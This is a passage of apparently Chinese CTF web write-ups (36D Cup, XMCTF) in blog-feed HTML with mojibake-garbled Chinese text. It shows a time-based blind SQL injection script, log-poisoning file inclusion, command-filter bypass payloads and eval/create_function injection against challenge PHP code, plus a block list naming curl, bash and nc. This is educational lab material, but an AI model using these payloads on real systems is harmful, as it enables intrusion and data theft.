class="line">all_info_u_want.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</span><br><span class="line">&#x2F;&#x2F;åœ¨user-agentå¤„å†™å…¥ä¸€å¥è¯æœ¨é©¬å³å¯åŒ…å«RCE</span><br></pre></td></tr></table></figure><h4 id="0X05ï¼šWEB-Login-Only-For-36D"><a href="#0X05ï¼šWEB-Login-Only-For-36D" class="headerlink" title="0X05ï¼šWEB_Login_Only_For_36D"></a>0X05ï¼šWEB_Login_Only_For_36D</h4><p>æ‰“å¼€æ˜¯ä¸ªæ³¨å…¥é¢˜ï¼Œå¸¸è§„æ‰‹æ®µfuzzä¸€ä¸‹ï¼Œå‘ç°è¿‡æ»¤äº†ä¸€ä¸‹ä¸œè¥¿</p><ul><li>å•å¼•å·</li><li>select substrç­‰å¾ˆå¤šå…³é”®å­—</li><li>= &gt; &lt;</li><li>ç©ºæ ¼ â€“ ; |ç­‰ç¬¦å·</li></ul><p>å‘ç°æºç æœ‰æç¤º</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- if (!preg_match('/admin/', $uname)) die; --&gt;</span><br><span class="line">&lt;!-- select * from 36d_user where username='$uname' and password='$passwd'; --&gt;</span><br></pre></td></tr></table></figure><p>ç”¨<code>admin\</code>æŠŠå•å¼•å·æ³¨é‡Šæ‰è®©åé¢<code>$passwd</code>é€ƒé€¸å‡ºå»</p><p>å¸ƒå°”ç›²æ³¨æ— å›æ˜¾ï¼Œç”¨æ—¶é—´ç›²æ³¨ï¼Œä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ord2hex</span><span class="params">(string)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        result += hex(ord(i))</span><br><span class="line"></span><br><span class="line">    result = result.replace(<span class="string">'0x'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'0x'</span> + result</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">url = <span class="string">"https://dc695489-cf68-45f2-97f9-1a21f62ba9e3.chall.ctf.show/"</span></span><br><span class="line">string = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'IABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string:</span><br><span class="line">        password = ord2hex(res + chr(j))</span><br><span class="line">        password = <span class="string">'or/**/if((password/**/REGEXP/**/binary/**/&#123;&#125;),sleep(10),1)#'</span>.format(password)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">"admin\\"</span>,</span><br><span class="line">            <span class="string">'password'</span>: password</span><br><span class="line">        &#125;</span><br><span class="line">        startTime = time.time()</span><br><span class="line">        r = req.post(url=url, data=data)</span><br><span class="line">        endtime = time.time()</span><br><span class="line">        <span class="keyword">if</span> endtime - startTime &gt; <span class="number">5</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>è·‘å‡ºæ¥å¯†ç æ˜¯ILoVeThlrtySixDï¼Œè·‘äº†å¥½å‡ æ¬¡æ‰è·‘å‡ºæ¥æ­£ç¡®çš„</p><h4 id="0X06-WUSTCTF-æœ´å®æ— åRevenge"><a href="#0X06-WUSTCTF-æœ´å®æ— åRevenge" class="headerlink" title="0X06:WUSTCTF__æœ´å®æ— åRevenge"></a>0X06:WUSTCTF__æœ´å®æ— åRevenge</h4><p>é¢˜ç›®ç›´æ¥ç»™äº†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $len=strlen($str);</span><br><span class="line">    $l=<span class="number">1</span>;</span><br><span class="line">    $k=intval($len/<span class="number">2</span>)+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;$k;$j++)</span><br><span class="line">        <span class="keyword">if</span> (substr($str,$j,<span class="number">1</span>)!=substr($str,$len-$j<span class="number">-1</span>,<span class="number">1</span>)) &#123;</span><br><span class="line">            $l=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> ($l==<span class="number">1</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    $numPositve = intval($num);</span><br><span class="line">    $numReverse = intval(strrev($num));</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[^0-9.]/'</span>, $num)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"éæ´²æ¬¢è¿ä½ 1"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (preg_match_all(<span class="string">"/\./"</span>, $num) &gt; <span class="number">1</span>) || (preg_match_all(<span class="string">"/\-/"</span>, $num) &gt; <span class="number">1</span>) || (preg_match_all(<span class="string">"/\-/"</span>, $num)==<span class="number">1</span> &amp;&amp; !preg_match(<span class="string">'/^[-]/'</span>, $num))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"æ²¡æœ‰è¿™æ ·çš„æ•°"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($num != $numPositve) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'æœ€å¼€å§‹ä¸Šé¢˜æ—¶å€™å¿˜å†™äº†è¿™ä¸ªï¼Œå¯¼è‡´è¿™level 1å˜æˆäº†å¼±æ™ºï¼Œæ€ªä¸å¾—è¿™ä¹ˆå¤šäººsolve'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($numPositve &lt;= <span class="number">-999999999999999999</span> || $numPositve &gt;= <span class="number">999999999999999999</span>) &#123; <span class="comment">//åœ¨64ä½ç³»ç»Ÿä¸­ intval()çš„ä¸Šé™ä¸æ˜¯2147483647 çœçœå§</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"éæ´²æ¬¢è¿ä½ 2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"å»éæ´²å§"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'md5'</span>]))&#123;</span><br><span class="line">    $md5=$_GET[<span class="string">'md5'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($md5==md5(md5($md5)))</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"å»éæ´²å§"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'get_flag'</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">'get_flag'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">" "</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"cat"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"more"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"tail"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"less"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"head"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"tac"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"sort"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"nl"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"$"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"curl"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"bash"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"nc"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"php"</span>, <span class="string">"36dCTFShow"</span>, $get_flag);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/['\*\"[?]/"</span>, $get_flag)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'éé¢„æœŸä¿®å¤*2'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;"</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"å¿«åˆ°éæ´²äº†"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"å»éæ´²å§"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€å±‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($num != $numPositve) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'æœ€å¼€å§‹ä¸Šé¢˜æ—¶å€™å¿˜å†™äº†è¿™ä¸ªï¼Œå¯¼è‡´è¿™level 1å˜æˆäº†å¼±æ™ºï¼Œæ€ªä¸å¾—è¿™ä¹ˆå¤šäººsolve'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//ä¼ æ•´æ•°ï¼Œä½†æ˜¯æ­£åˆ™è¿‡æ»¤äº†.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;"</span>;</span><br><span class="line"> <span class="comment">//åˆ¤æ–­æ˜¯å›æ–‡ä¸²åˆä¸æ˜¯å›æ–‡ä¸²</span></span><br><span class="line">    </span><br><span class="line">    $numPositve = intval($num);</span><br><span class="line"><span class="keyword">if</span> ($num != $numPositve) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'æœ€å¼€å§‹ä¸Šé¢˜æ—¶å€™å¿˜å†™äº†è¿™ä¸ªï¼Œå¯¼è‡´è¿™level 1å˜æˆäº†å¼±æ™ºï¼Œæ€ªä¸å¾—è¿™ä¹ˆå¤šäººsolve'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æ ¹æ®Yingå¸ˆå‚…åšå®¢å†™çš„è¿™é‡Œç”¨æµ®ç‚¹æ•°ç²¾åº¦çš„é—®é¢˜å°±å¯ä»¥ç»•è¿‡</span></span><br><span class="line">payload:num=<span class="number">1000000000000000.00000000000000010</span></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå±‚</p><p>MD5ç¡¬ç¢°</p><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mport hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>**<span class="number">33</span>):</span><br><span class="line">    i = str(i)</span><br><span class="line">    num = <span class="string">'0e'</span> + i</span><br><span class="line">    md5 = hashlib.md5(num.encode()).hexdigest()</span><br><span class="line">    md5 = hashlib.md5(md5.encode()).hexdigest()</span><br><span class="line">    <span class="comment"># print(md5)</span></span><br><span class="line">    <span class="keyword">if</span> md5[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">'0e'</span> <span class="keyword">and</span> md5[<span class="number">2</span>:].isdigit():</span><br><span class="line">        print(<span class="string">'success str:&#123;&#125;  md5(str):&#123;&#125;'</span>.format(num, md5))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> int(i) % <span class="number">1000000</span> == <span class="number">0</span>:</span><br><span class="line">         print(i)</span><br><span class="line">//ç»“æœï¼š<span class="number">0e1138100474</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰å±‚</p><p>banäº†å¾ˆå¤šå‘½ä»¤ï¼Œè¿™é‡Œå¯ä»¥ç”¨\æ–œæ æ¥ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_flag=ca\t&lt;flag.ph\p</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num&#x3D;1000000000000000.00000000000000010&amp;md5&#x3D;0e1138100474&amp;get_flag&#x3D;ca\t&lt;flag.ph\p</span><br></pre></td></tr></table></figure><p>åœ¨ç½‘é¡µæºç å¤„æ‰¾åˆ°flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;36Dæ¯&quot;&gt;&lt;a href=&quot;#36Dæ¯&quot; class=&quot;headerlink&quot; title=&quot;36Dæ¯&quot;&gt;&lt;/a&gt;36Dæ¯&lt;/h1&gt;
    
    </summary>
    
    
    
      <category term="show" scheme="http://yoursite.com/tags/show/"/>
    
  </entry>
  
  <entry>
    <title>XMCTF</title>
    <link href="http://yoursite.com/2020/04/29/XMCTF/"/>
    <id>http://yoursite.com/2020/04/29/XMCTF/</id>
    <published>2020-04-29T07:25:44.000Z</published>
    <updated>2020-05-08T10:01:46.710Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-EASY-WEB1"><a href="#0x01-EASY-WEB1" class="headerlink" title="0x01:EASY_WEB1"></a>0x01:EASY_WEB1</h3><a id="more"></a><p>ç›´æ¥ç»™äº†æºç ï¼Œå®¡è®¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$key = <span class="string">"bad"</span>;</span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">if</span>($key === <span class="string">'bad'</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'badbad!!!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$act = @$_GET[<span class="string">'act'</span>];</span><br><span class="line">$arg = @$_GET[<span class="string">'arg'</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>,$act)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'check'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $act($arg,<span class="string">''</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'666'</span>;</span><br><span class="line">badbad!!!</span><br></pre></td></tr></table></figure><p>å˜é‡è¦†ç›–,extract($_POST)æ‰“å¼€äº†å…¨å±€å˜é‡POSTï¼Œå¯ä»¥ç”¨postçš„å€¼æ¥è¦†ç›–keyç»•è¿‡ç¬¬ä¸€ä¸ªæ¡ä»¶ï¼Œåé¢çš„æ­£åˆ™åŒ¹é…é€šè¿‡æŸ¥èµ„æ–™å‘ç°æ˜¯ä¸€ä¸ªåˆ›å»ºå‡½æ•°</p><p>payload:?act=\create_function&amp;arg=){}var_dump(scandir(â€˜../â€˜));//</p><p>ç›¸å½“äºæ˜¯function xxx(arg){}=function(){var_dump(scandir(â€˜../â€˜));}//){},åé¢çš„ä¸¤ä¸ªæ–œæ æ³¨é‡Šäº†åé¢çš„å†…å®¹ï¼Œè¿™æ ·å‡½æ•°å°±å®Œæ•´äº†</p><img src="/2020/04/29/XMCTF/1.png" class="" title="examplename"><p>å¯ä»¥çœ‹åˆ°æœ‰â€ffflll4gâ€æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶å°±å¯ä»¥äº†</p><h4 id="0X02ï¼šWEB7"><a href="#0X02ï¼šWEB7" class="headerlink" title="0X02ï¼šWEB7"></a>0X02ï¼šWEB7</h4><p>æ‰“å¼€åœ°å€ï¼Œæºç ç»™äº†ï¼Œå®¡è®¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¤§å°å†™å­—æ¯å’Œæ•°å­—éƒ½è¢«è¿‡æ»¤äº†ï¼Œè€ƒè™‘ç”¨ç¼–ç è¿›è¡Œç»•è¿‡ï¼Œä¹‹å‰ç¢°åˆ°è¿‡ç”¨å–åå†urlç¼–ç å¯ä»¥ç»•è¿‡</span></span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//é€šè¿‡ä¼ ä¸€ä¸ªä¸­é—´å˜é‡$_,åœ¨é€šè¿‡$_()è°ƒç”¨getFlag()æ–¹æ³•è¯»å–ï¼Œè¿™é‡Œç›¸å½“äºæ˜¯code=$_=getFlag;getFlag();</span></span><br></pre></td></tr></table></figure><p>payloadï¼š?code=$<em>=~%98%9A%8B%B9%93%9E%98;$</em>();ç›¸å½“äºæ˜¯code=$_=getFlag;getFlag();</p><h4 id="0X03-WEB4"><a href="#0X03-WEB4" class="headerlink" title="0X03:WEB4"></a>0X03:WEB4</h4><p>æ‰“å¼€é¢˜ç›®ç»™äº†ä¸€ä¸²keyï¼še086aa137fa19f67d27b39d0eca18610ï¼ŒMD5è§£å¯†ä¸€ä¸‹ï¼Œæ˜¯ä¸€ä¸²ipåœ°å€ï¼Œ1.1.1.1,ç”¨burpæŠ“åŒ…ä¼ªé€ ip</p><img src="/2020/04/29/XMCTF/2.png" class="" title="examplename"><p>è®¿é—®dhudndrgrhs.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$disable_fun = [<span class="string">"assert"</span>,<span class="string">"print_r"</span>,<span class="string">"system"</span>, <span class="string">"shell_exec"</span>,<span class="string">"ini_set"</span>, <span class="string">"scandir"</span>, <span class="string">"exec"</span>,<span class="string">"proc_open"</span>, <span class="string">"error_log"</span>, <span class="string">"ini_alter"</span>, <span class="string">"ini_set"</span>, <span class="string">"pfsockopen"</span>, <span class="string">"readfile"</span>, <span class="string">"echo"</span>, <span class="string">"file_get_contents"</span>, <span class="string">"readlink"</span>, <span class="string">"symlink"</span>, <span class="string">"popen"</span>, <span class="string">"fopen"</span>, <span class="string">"file"</span>, <span class="string">"fpassthru"</span>];</span><br><span class="line">$disable_fun = array_merge($disable_fun, get_defined_functions()[<span class="string">'internal'</span>]);</span><br><span class="line"><span class="keyword">foreach</span>($disable_fun <span class="keyword">as</span> $i)&#123;</span><br><span class="line">    <span class="keyword">if</span>(stristr($_GET[shell], $i)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'xmctf'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($_GET[shell]); </span><br><span class="line"><span class="comment">//å‡ ä¹æ‰€æœ‰çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´éƒ½è¢«banäº†ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨phpçš„å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œæ‹¼æ¥å‘½ä»¤æ¥ç»•è¿‡æ­£åˆ™</span></span><br><span class="line">payload=$a=<span class="string">'sys'</span>.<span class="string">'tem'</span>;$a(<span class="string">'cat flag.php'</span>);</span><br><span class="line">å¯ä»¥çœ‹åˆ°flag.phpæ–‡ä»¶ï¼Œè¯»å–ï¼Œåœ¨ç½‘é¡µæºç å¤„å‘ç°flag</span><br></pre></td></tr></table></figure><h4 id="0X04-WEB10"><a href="#0X04-WEB10" class="headerlink" title="0X04:WEB10"></a>0X04:WEB10</h4><img src="/2020/04/29/XMCTF/3.png" class="" title="examplename"><p>å¯ä»¥çœ‹åˆ°æç¤ºæ˜¯thinkphp5ç‰ˆæœ¬ï¼Œç›´æ¥ä¸Špayload</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 